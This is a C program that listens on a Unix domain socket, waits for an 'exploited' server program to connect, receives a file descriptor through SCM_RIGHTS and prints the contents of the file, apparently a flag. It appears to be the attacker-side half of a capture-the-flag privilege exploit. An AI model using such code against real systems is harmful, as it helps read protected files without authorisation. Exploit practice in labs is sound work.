#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>

#define SOCKET_PATH "./socket_path"

int main() {
    int listen_sfd, client_sfd, received_fd = -1;
    struct sockaddr_un addr;
    struct msghdr msg = {0};
    struct iovec iov[1];
    char data_buf[100];
    char control_buf[CMSG_SPACE(sizeof(int))];      // Buffer for SCM_RIGHTS

    // Create a socket and bind it to a file path
    listen_sfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (listen_sfd == -1) {
        perror("[Client] socket");
        return 1;
    }

    // Ensure the socket file doesn't exist from a previous run
    unlink(SOCKET_PATH); 

    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);

    if (bind(listen_sfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        perror("[Client] bind");
        close(listen_sfd);
        return 1;
    }
    printf("[Client] Listening on socket: %s\n", SOCKET_PATH);

    // Listen and wait for the exploited program (Server) to connect
    if (listen(listen_sfd, 5) == -1) {
        perror("[Client] listen");
        close(listen_sfd);
        return 1;
    }

    client_sfd = accept(listen_sfd, NULL, NULL);
    if (client_sfd == -1) {
        perror("[Client] accept");
        close(listen_sfd);
        return 1;
    }
    close(listen_sfd); // Done listening
    printf("[Client] Server connected. Preparing to receive FD.\n");

    // Setup iovec (to receive dummy data)
    iov[0].iov_base = data_buf;
    iov[0].iov_len = sizeof(data_buf);

    // Setup msghdr for receiving
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;
    msg.msg_control = control_buf;
    msg.msg_controllen = sizeof(control_buf);

    // Call recvmsg to receive the dummy data and the FD in ancillary data
    ssize_t n = recvmsg(client_sfd, &msg, 0);
    if (n < 0) {
        perror("[Client] recvmsg");
        close(client_sfd);
        return 1;
    }
    printf("[Client] Received %zd bytes of dummy data.\n", n);

    // Check the ancillary data for the file descriptor
    struct cmsghdr *cmsg;
    for (cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
        if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
            // Found the transferred FD!
            received_fd = *(int *)CMSG_DATA(cmsg);
            printf("[Client] SUCCESSFULLY RECEIVED FILE DESCRIPTOR: %d\n", received_fd);
            break;
        }
    }

    if (received_fd == -1) {
        printf("[Client] FAILED to find SCM_RIGHTS data.\n");
        close(client_sfd);
        return 1;
    }

    // Use the received FD to read the file contents directly
    char flag_contents[100];
    ssize_t flag_n = read(received_fd, flag_contents, sizeof(flag_contents) - 1);

    if (flag_n > 0) {
        flag_contents[flag_n] = '\0';
        printf("File contents: %s\n", flag_contents);
    } else {
        perror("[Client] Final read failed");
    }

    // Cleanup
    close(received_fd);
    close(client_sfd);
    unlink(SOCKET_PATH);

    return 0;
}